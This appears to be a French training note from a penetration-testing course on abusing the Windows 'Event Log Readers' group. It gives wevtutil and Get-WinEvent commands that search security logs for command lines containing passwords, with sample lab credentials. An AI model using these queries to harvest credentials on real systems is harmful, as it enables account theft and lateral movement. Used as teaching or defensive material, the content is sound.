# Event Log Readers

***

{% hint style="warning" %}
L’audit des événements de création de processus (ID 4688) enregistre la création des nouveaux processus et leurs lignes de commande dans le journal de sécurité Windows. Cela permet de détecter des comportements suspects, notamment des commandes fréquemment utilisées par les attaquants (comme tasklist, ipconfig, systeminfo). Ces données peuvent être analysées via des outils SIEM ou ElasticSearch pour renforcer la sécurité. En complément, des règles AppLocker peuvent limiter l’exécution de certaines commandes à risque. Les administrateurs et certains utilisateurs peuvent accéder à ces journaux pour surveiller et réagir rapidement aux menaces.
{% endhint %}

<mark style="color:green;">**Confirmer l'appartenance au groupe**</mark>

```bash
C:\htb> net localgroup "Event Log Readers"
```

***

<mark style="color:green;">**Recherche dans les journaux de sécurité avec wevtutil**</mark>

```powershell
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

**Exemple de sortie :**

```
Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

<mark style="color:green;">**Passer des identifiants à wevtutil**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
{% endcode %}

Pour **Get-WinEvent**, la syntaxe est la suivante. Dans cet exemple, nous filtrons les événements de création de processus (**4688**), qui contiennent **/user** dans la ligne de commande du processus.

> **Remarque** : La recherche dans le journal de sécurité avec **Get-WinEvent** nécessite un accès administrateur ou des permissions ajustées sur la clé de registre **HKLM\System\CurrentControlSet\Services\Eventlog\Security**. L'appartenance au seul groupe **Event Log Readers** n'est pas suffisante.

<mark style="color:green;">**Recherche dans les journaux de sécurité avec Get-WinEvent**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
{% endcode %}

***

#### <mark style="color:green;">Autres journaux importants</mark>

D'autres journaux incluent le journal **PowerShell Operational**, qui peut également contenir des informations sensibles ou des identifiants si l'enregistrement des blocs de script ou des modules est activé. Ce journal est accessible aux utilisateurs non privilégiés.

***
